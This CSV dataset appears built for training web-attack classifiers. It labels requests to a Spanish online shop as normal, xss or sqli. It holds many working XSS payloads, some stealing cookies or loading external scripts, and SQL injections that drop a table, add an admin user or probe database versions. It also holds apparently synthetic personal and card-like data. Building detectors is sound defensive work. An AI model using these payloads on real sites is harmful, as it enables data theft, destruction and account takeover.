payload,type
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>",xss
"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",xss
"<bgsound src=""javascript:document.vulnerable=true;"">",xss
index.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
imagenes/1.gif,normal
celfa,normal
"""`'><script>\xE2\x80\xA8javascript:alert(1)</script>",xss
jara escobedo,normal
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss
"s),s: select * from users where id=1 or ""),"" or 1=1 -- 1",sqli
imagenes/2.gif,normal
armenteros,normal
trombn,normal
publico/caracteristicas.jsp?id=2,normal
terl6z,normal
publico/caracteristicas.jsp?id=2,normal
imagenes/cmenbul.gif,normal
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
augur,normal
"<IMG DYNSRC=""javascript:javascript:alert(1)"">",xss
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
index.jsp,normal
"<;BGSOUND SRC="";javascript:alert(';XSS';);"";>;",xss
publico/miembros.jsp,normal
a' or 1=1; --,sqli
index.jsp,normal
publico/caracteristicas.jsp?id=2,normal
dalmau,normal
5.66E+15,normal
ansorger,normal
"s)n: select * from users where id=1 or "")["" or 1=1 -- 1",sqli
global/menum.jsp,normal
global/creditos.jsp,normal
"c/ fray diego de cadiz, 50",normal
imagenes/logo.gif,normal
index.jsp,normal
' ; drop table temp --,sqli
"ooUEf: select * from users where id=1 <@<@ union select version(),version() -- 1",sqli
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
miembros/index.jsp,normal
&#x3c;,xss
swearing,normal
reencarnar,normal
"<style>BODY{-moz-binding:url(""http://www.securitycompass.com/xssmoz.xml#xss"")}</style>",xss
imagenes/3.gif,normal
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=39&B1=A%F1adir+al+carrito,normal
publico/caracteristicas.jsp?id=1,normal
"on.UE: select * from users where id=1 *$ . union select null,@@VERSION -- 1",sqli
"<a href=""\xE2\x80\x86javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
deying,normal
publico/miembros.jsp,normal
necforo,normal
imagenes/2.gif,normal
imagenes/cmenbul.gif,normal
shangtia,normal
c/ arco de veronicas s/n 4e,normal
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;,xss
o1n&1: select * from users where id=1 <@1$ or 1=1 -- 1,sqli
publico/miembros.jsp,normal
index.jsp,normal
<img SRC='vbscript:document.vulnerable=true;'>,xss
"<body onPopState body onPopState=""javascript:javascript:alert(1)""></body onPopState>",xss
imagenes/nuestratierra.jpg,normal
vidrioso,normal
5659,normal
miramar,normal
"' || myappadmin.adduser('admin', 'newpass') || '",sqli
publico/miembros.jsp,normal
publico/carrito.jsp,normal
"perl -e &#039;print \"";<;IMG SRC=java\0script:alert(\"";XSS\"";)>;\"";;&#039; >; out",xss
publico/pagar.jsp?modo=insertar&precio=2161&B1=Pasar+por+caja,normal
miembros/imagenes/castro.jpg,normal
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=90&B1=A%F1adir+al+carrito,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/registro.jsp?modo=registro&login=zinkie0&password=9i3a&nombre=Esteban&apellidos=Delvalle+Llers&email=luxford_baumann%40lasiestacreativa.tel&dni=47651101T&direccion=Calle+Espiel+71+&ciudad=Rab%F3s&cp=45634&provincia=Zaragoza&ntc=8349635911694626&B1=Registrar,normal
publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=63&B1=A%F1adir+al+carrito,normal
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/pagar.jsp?modo=insertar&precio=7205&B1=Confirmar,normal
imagenes/nuestratierra.jpg,normal
ezequas,normal
miembros/imagenes/ogono.jpg,normal
adoree-halsted1@estoespresto.af,normal
5366,normal
imagenes/logo.gif,normal
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
70679983v,normal
""">/XaDoS/><script>alert(document.cookie)</script><script src=""http://www.site.com/XSS.js""></script>",xss
imagenes/nuestratierra.jpg,normal
sant vicen de torell,normal
dumensnil@bidrain.tr,normal
"""`'><script>\xE2\x80\x85javascript:alert(1)</script>",xss
z5r1174osa,normal
publico/registro.jsp?modo=registro&login=blanchet&password=recital&nombre=Filem%F3n&apellidos=Ditte+Pallar%E8s&email=moston%40sierradealcaraz.sg&dni=21096784B&direccion=Calle+Miquel+Santandreu+66%2C+&ciudad=Valderredible&cp=04878&provincia=Le%F3n&ntc=1764884801392734&B1=Registrar,normal
<object onerror=javascript:javascript:alert(1)>,xss
85802086b,normal
18567,normal
publico/registro.jsp?modo=registro&login=haralamb&password=PO2546OtO4&nombre=Amancio&apellidos=Daya+Basulto&email=gila-berova%40artforall.mm&dni=06314426Y&direccion=C%2F+Plza.+18%2C+6-E&ciudad=Chimillas&cp=19144&provincia=C%E1ceres&ntc=6002328199807748&B1=Registrar,normal
beaumont@lasmilyuna.gi,normal
c/ david 169 6-h,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=100&cantidad=36&B1=A%F1adir+al+carrito,normal
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,xss
publico/caracteristicas.jsp?id=2,normal
"""`'><script>\x0Bjavascript:alert(1)</script>",xss
imagenes/cmenbul.gif,normal
tiedeman,normal
publico/miembros.jsp,normal
38821598j,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
&#x003C;,xss
publico/pagar.jsp?modo=insertar&precio=9334&B1=Confirmar,normal
miembros/imagenes/castro.jpg,normal
eu,normal
miembros/salir.jsp,normal
63829565b,normal
@var select @var as var into temp end --,sqli
"<embed src=""javascript:alert(1)"">",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/imagenes/ogono.jpg,normal
miembros/imagenes/zarauz.jpg,normal
<svg><script onlypossibleinopera:-)> alert(1),xss
global/creditos.jsp,normal
index.jsp,normal
eddier,normal
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
subidor,normal
imagenes/nuestratierra.jpg,normal
07441681p,normal
miembros/editar.jsp?modo=registro&login=padraic&password=-se331rio&nombre=Yuvia&apellidos=Escogido+Francesc&email=challee%40zonamodelos.co&dni=02933716C&direccion=Cami+Son+Anglada%2C+S%2FN+&ciudad=Lagata&cp=31382&provincia=Navarra&ntc=0777026292170424&B1=Registrar,normal
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
3.20E+15,normal
publico/miembros.jsp,normal
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
07608453f,normal
miembros/salir.jsp,normal
imagenes/logo.gif,normal
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=41&B1=A%F1adir+al+carrito,normal
"<img src onerror /"" '""= alt=javascript:alert(1)//"">",xss
<iframe/onreadystatechange=alert(1),xss
miembros/index.jsp,normal
tejeda y segoyuela,normal
miembros/salir.jsp,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=91&B1=A%F1adir+al+carrito,normal
"<;IMG SRC="";jav&;#x0A;ascript:alert(';XSS';);"";>;",xss
<font style='color:expression(alert(document.cookie))'>,xss
publico/productos.jsp,normal
global/estilos.css,normal
siku@tartasconamor.in,normal
ayoroa,normal
imagenes/2.gif,normal
4s2cu8e44,normal
miembros/imagenes/ogono.jpg,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=20&B1=A%F1adir+al+carrito,normal
<// style=x:expression\28javascript:alert(1)\29>,xss
17889538t,normal
publico/pagar.jsp?modo=insertar&precio=8271&B1=Pasar+por+caja,normal
hao,normal
"<iframe src=""vbscript:document.vulnerable=true;"">",xss
<BODY ONLOAD=alert('XSS')>,xss
"admin"") or (""1""=""1",sqli
&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;,xss
40560,normal
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;,xss
"&n.o1: select * from users where id=1 or $ .=1 union select 1,@@VERSION -- 1",sqli
s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1',sqli
adelina,normal
lu,normal
dey,normal
miembros/fotos.jsp,normal
imagenes/2.gif,normal
publico/caracteristicas.jsp?id=2,normal
vilma,normal
8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 -->,sqli
"<style>.XSS{background-image:url(""javascript:document.vulnerable=true"");}</STYLE><A CLASS=XSS></a>",xss
index.jsp,normal
index.jsp,normal
publico/productos.jsp,normal
"d=\""alert('XSS');\\"")\"";",xss
‘)alert(1);//,xss
"""`'><script>\xE2\x80\x87javascript:alert(1)</script>",xss
publico/caracteristicas.jsp?id=2,normal
"<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
publico/pagar.jsp?modo=insertar&precio=2306&B1=Pasar+por+caja,normal
lamarr@tardos.mobi,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
publico/caracteristicas.jsp?id=2,normal
global/creditos.jsp,normal
"<>""'%;)(&+",sqli
heile,normal
"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",xss
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a>",xss
5150,normal
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",xss
26527823z,normal
index.jsp,normal
"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",xss
global/titulo.jsp,normal
"guardia, la",normal
glyn7,normal
imagenes/cmenbul.gif,normal
')%20or%20('x'='x,sqli
<video/poster/onerror=alert()>,xss
pavlow@permutatucasa.fm,normal
publico/carrito.jsp,normal
6.80E+13,normal
imagenes/3.gif,normal
"c/ barriada nueva andalucia, 79, 5?f",normal
imagenes/logo.gif,normal
c/ atlantico 167,normal
global/titulo.jsp,normal
57584234p,normal
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
<div style=content:url(%(svg)s)></div>,xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
painter.stovin@tetdevelocidad.bn,normal
"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",xss
imagenes/cmenbul.gif,normal
patchsqa,normal
petree,normal
miembros/imagenes/ogono.jpg,normal
<svg contentScriptType=text/vbs><script>MsgBox+1,xss
<BODY ONLOAD=alert(‘XSS’)>,xss
publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=100&cantidad=83&B1=A%F1adir+al+carrito,normal
global/creditos.jsp,normal
1.53E+15,normal
duesaiges,normal
publico/productos.jsp,normal
publico/carrito.jsp,normal
""" or """"*""",sqli
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",xss
imagenes/cmenbul.gif,normal
